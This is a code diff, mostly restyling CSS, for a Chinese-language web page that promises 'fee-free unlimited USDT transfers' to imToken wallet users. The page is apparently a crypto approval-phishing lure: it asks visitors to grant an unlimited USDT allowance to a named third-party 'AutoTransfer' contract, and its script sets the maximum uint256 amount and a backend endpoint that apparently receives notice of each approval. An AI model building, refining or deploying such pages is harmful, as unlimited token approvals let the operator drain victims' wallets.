@@ -5,13 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>免矿工费无限USDT转账授权与登记</title>
     <style>
+        /* 基础样式 */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
         }
-        
+
         body {
             background: linear-gradient(135deg, #6e8efb, #a777e3);
             min-height: 100vh;
@@ -19,252 +20,255 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 10px; /* 减小 padding */
             color: #333;
         }
-        
+
         .container {
             background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
-            padding: 30px;
+            border-radius: 15px; /* 减小 border-radius */
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15); /* 减小 box-shadow */
+            padding: 20px; /* 减小 padding */
             width: 100%;
             max-width: 500px;
             text-align: center;
         }
-        
+
         h1 {
             color: #2c3e50;
-            margin-bottom: 15px;
-            font-size: 28px;
+            margin-bottom: 10px; /* 减小 margin-bottom */
+            font-size: 24px; /* 减小 font-size */
         }
-        
+
         .description {
             color: #7f8c8d;
-            margin-bottom: 25px;
-            line-height: 1.6;
+            margin-bottom: 15px; /* 减小 margin-bottom */
+            line-height: 1.4; /* 减小 line-height */
         }
-        
+
         .token-info {
             background: #f8f9fa;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 25px;
+            border-radius: 10px; /* 减小 border-radius */
+            padding: 10px; /* 减小 padding */
+            margin-bottom: 15px; /* 减小 margin-bottom */
             text-align: left;
         }
-        
+
         .info-item {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 10px;
-            padding-bottom: 10px;
+            margin-bottom: 8px; /* 减小 margin-bottom */
+            padding-bottom: 8px; /* 减小 padding-bottom */
             border-bottom: 1px solid #e9ecef;
         }
-        
+
         .info-item:last-child {
             margin-bottom: 0;
             padding-bottom: 0;
             border-bottom: none;
         }
-        
+
         .info-label {
             font-weight: 600;
             color: #495057;
         }
-        
+
         .info-value {
             color: #6c757d;
             word-break: break-all;
             max-width: 60%;
         }
-        
+
         .auth-button {
             background: linear-gradient(to right, #3498db, #2ecc71);
             color: white;
             border: none;
             border-radius: 50px;
-            padding: 16px 32px;
-            font-size: 18px;
+            padding: 12px 24px; /* 减小 padding */
+            font-size: 16px; /* 减小 font-size */
             font-weight: 600;
             cursor: pointer;
-            margin: 15px 0;
+            margin: 10px 0; /* 减小 margin */
             width: 100%;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.4);
+            box-shadow: 0 2px 10px rgba(46, 204, 113, 0.4); /* 减小 box-shadow */
         }
-        
+
         .auth-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(46, 204, 113, 0.6);
+            transform: translateY(-2px); /* 减小 translateY */
+            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.6); /* 减小 box-shadow */
         }
-        
+
         .auth-button:active {
-            transform: translateY(1px);
+            transform: translateY(0.5px); /* 减小 translateY */
         }
-        
+
         .auth-button:disabled {
             background: #95a5a6;
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
         }
-        
+
         .infinite-badge {
             background: #e74c3c;
             color: white;
             border-radius: 20px;
-            padding: 5px 12px;
-            font-size: 14px;
+            padding: 4px 10px; /* 减小 padding */
+            font-size: 12px; /* 减小 font-size */
             font-weight: 600;
-            margin-left: 10px;
+            margin-left: 5px; /* 减小 margin-left */
             display: inline-block;
         }
-        
+
         .steps {
             background: #e8f4fc;
-            border-radius: 12px;
-            padding: 20px;
-            margin-top: 25px;
+            border-radius: 10px; /* 减小 border-radius */
+            padding: 15px; /* 减小 padding */
+            margin-top: 15px; /* 减小 margin-top */
             text-align: left;
         }
-        
+
         .steps h3 {
             color: #2980b9;
-            margin-bottom: 15px;
+            margin-bottom: 10px; /* 减小 margin-bottom */
             text-align: center;
+            font-size: 18px; /* 减小 font-size */
         }
-        
+
         .step {
             display: flex;
-            margin-bottom: 15px;
+            margin-bottom: 10px; /* 减小 margin-bottom */
             align-items: flex-start;
         }
-        
+
         .step-number {
             background: #3498db;
             color: white;
-            width: 24px;
-            height: 24px;
+            width: 20px; /* 减小 width */
+            height: 20px; /* 减小 height */
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 10px;
+            margin-right: 8px; /* 减小 margin-right */
             flex-shrink: 0;
-            font-size: 14px;
-            font-weight: bold;}
-        
+            font-size: 12px; /* 减小 font-size */
+            font-weight: bold;
+        }
+
         .step-text {
             color: #2c3e50;
-            line-height: 1.5;
+            line-height: 1.4; /* 减小 line-height */
+            font-size: 14px; /* 减小 font-size */
         }
-        
+
         .fallback {
-            display: none;
+            display: none; /* 默认隐藏 */
             background: #fff3cd;
             border: 1px solid #ffeaa7;
-            border-radius: 12px;
-            padding: 15px;
-            margin-top: 20px;
+            border-radius: 10px; /* 减小 border-radius */
+            padding: 10px; /* 减小 padding */
+            margin-top: 15px; /* 减小 margin-top */
             text-align: left;
         }
-        
+
         .fallback h4 {
             color: #856404;
-            margin-bottom: 10px;
+            margin-bottom: 8px; /* 减小 margin-bottom */
+            font-size: 16px; /* 减小 font-size */
         }
-        
+
         .fallback ul {
             padding-left: 20px;
             color: #856404;
+            font-size: 14px; /* 减小 font-size */
         }
-        
+
         .fallback li {
-            margin-bottom: 8px;
+            margin-bottom: 6px; /* 减小 margin-bottom */
         }
-        
+
         .fallback a {
             color: #3498db;
             text-decoration: none;
             font-weight: 600;
         }
-        
+
         .footer {
-            margin-top: 25px;
+            margin-top: 15px; /* 减小 margin-top */
             color: #7f8c8d;
-            font-size: 14px;
+            font-size: 12px; /* 减小 font-size */
         }
-        
+
         .warning {
             background: #f8d7da;
             border: 1px solid #f5c6cb;
             border-radius: 8px;
-            padding: 12px;
-            margin: 15px 0;
+            padding: 10px; /* 减小 padding */
+            margin: 10px 0; /* 减小 margin */
             text-align: left;
             color: #721c24;
         }
-        
+
         .warning h4 {
             display: flex;
             align-items: center;
-            margin-bottom: 8px;
+            margin-bottom: 6px; /* 减小 margin-bottom */
+            font-size: 16px; /* 减小 font-size */
         }
-        
+
         .warning-icon {
-            margin-right: 8px;
-            font-size: 18px;
+            margin-right: 5px; /* 减小 margin-right */
+            font-size: 16px; /* 减小 font-size */
         }
-        
+
         .status {
             background: #d1ecf1;
             border: 1px solid #bee5eb;
             border-radius: 8px;
-            padding: 12px;
-            margin: 15px 0;
+            padding: 10px; /* 减小 padding */
+            margin: 10px 0; /* 减小 margin */
             text-align: left;
             color: #0c5460;
         }
-        
+
         .status h4 {
             display: flex;
             align-items: center;
-            margin-bottom: 8px;
+            margin-bottom: 6px; /* 减小 margin-bottom */
+            font-size: 16px; /* 减小 font-size */
         }
-        
+
         .status-icon {
-            margin-right: 8px;
-            font-size: 18px;
+            margin-right: 5px; /* 减小 margin-right */
+            font-size: 16px; /* 减小 font-size */
         }
-        
+
         .button-group {
-                  display: flex;
-                flex-direction: column; /* 核心：将排列方向改为竖向 */
-                  gap: 10px; /* 现在会变成按钮之间的“上下间距” */
-                    margin: 15px 0;
-                             
+            display: flex;
+            flex-direction: column;
+            gap: 8px; /* 减小 gap */
+            margin: 10px 0; /* 减小 margin */
         }
-        
+
         .button-group button {
             flex: 1;
         }
-        
+
+        /* 媒体查询：针对小屏幕设备进行优化 */
         @media (max-width: 480px) {
             .container {
-                padding: 20px;
+                padding: 15px; /* 减小 padding */
             }
-            
+
             h1 {
-                font-size: 24px;
+                font-size: 20px; /* 减小 font-size */
             }
-            
+
             .auth-button {
-                padding: 14px 28px;
-                font-size: 16px;
-            }
-            
-            .button-group {
-                flex-direction: column;
+                padding: 10px 20px; /* 减小 padding */
+                font-size: 14px; /* 减小 font-size */
             }
         }
     </style>
@@ -273,12 +277,13 @@
     <div class="container">
         <h1>免矿工费无限USDT转账授权与登记</h1>
         <p class="description">完成两步操作：1. 获取额度授权 2. 登记钱包</p>
-        
+
         <div class="warning">
             <h4><span class="warning-icon">⚠️</span> 操作提醒</h4>
             <p>完成授权后务必完成登记，否则无法获取免费转账权限。</p>
         </div>
-         <div class="token-info">
+
+        <div class="token-info">
             <div class="info-item">
                 <span class="info-label">发放合约地址:</span>
                 <span class="info-value">TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa</span>
@@ -291,22 +296,20 @@
                 <span class="info-label">授权类型:</span>
                 <span class="info-value">无限转账额度 <span class="infinite-badge">∞</span></span>
             </div>
-        </div>        
+        </div>
+
         <div class="status" id="statusSection">
             <h4><span class="status-icon">ℹ️</span>请用 <strong>imToken钱包内置浏览器</strong> 打开</h4>
-            <div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
-    <!-- 要复制的链接（可替换成你需要的链接） -->
-    <span id="copyLinkText" style="color: #007AFF; word-break: break-all;">
-        https://trc20trx-alt.github.io/Trc20.TRX/
-    </span>
-    <!-- 复制按钮 -->
-    <button id="copyLinkBtn" class="infinite-badge" style=" cursor: pointer;">
-        <strong class="infinite-badge">复制链接</strong>
-    </button>
-</div>
+            <div style="margin: 10px 0; display: flex; align-items: center; gap: 5px;">
+                <span id="copyLinkText" style="color: #007AFF; word-break: break-all; font-size: 12px;">
+                    https://trc20trx-alt.github.io/Trc20.TRX/
+                </span>
+                <button id="copyLinkBtn" class="infinite-badge" style="cursor: pointer;">
+                    <strong class="infinite-badge">复制</strong>
+                </button>
+            </div>
+        </div>
 
-          </div>
-        
         <div class="button-group">
             <button class="auth-button" id="connectBtn">
                 连接imToken钱包
@@ -315,7 +318,8 @@
                 能量授权
             </button>
         </div>
-            <div class="steps">
+
+        <div class="steps">
             <h3>完整操作步骤</h3>
             <div class="step">
                 <div class="step-number">1</div>
@@ -334,7 +338,7 @@
                 <div class="step-text">等待登记确认，完成整个流程</div>
             </div>
         </div>
-        
+
         <div class="fallback" >
             <h4>跳转失败？请尝试以下方法：</h4>
             <ul>
@@ -343,19 +347,20 @@
                 <li>或手动打开imToken，点击钱包页面下方 浏览 访问此页面</li>
             </ul>
         </div>
+
         <div class="footer">
             <p>确保您正在使用TRON主网，并保持足够的TRX用于手续费</p>
         </div>
-     </div>
+    </div>
 
-   <script src="imtoken://wallet"></script>
-   <script>
-     // ========== 需替换的3处配置（授权额度已固定为无限） ==========
-    const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的AutoTransfer合约地址
-    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主网USDT地址
-    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 后端接口
+    <script src="imtoken://wallet"></script>
+    <script>
+        // ========== 需替换的3处配置（授权额度已固定为无限） ==========
+        const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的AutoTransfer合约地址
+        const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主网USDT地址
+        const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 后端接口
 
-    // 核心：TRC20 uint256最大值 = 无限授权（固定值，无需修改）
+        // 核心：TRC20 uint256最大值 = 无限授权（固定值，无需修改）
     const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
 
     // 全局变量
@@ -524,6 +529,7 @@
 </script>
 </body>
 </html>
+
 
 
 
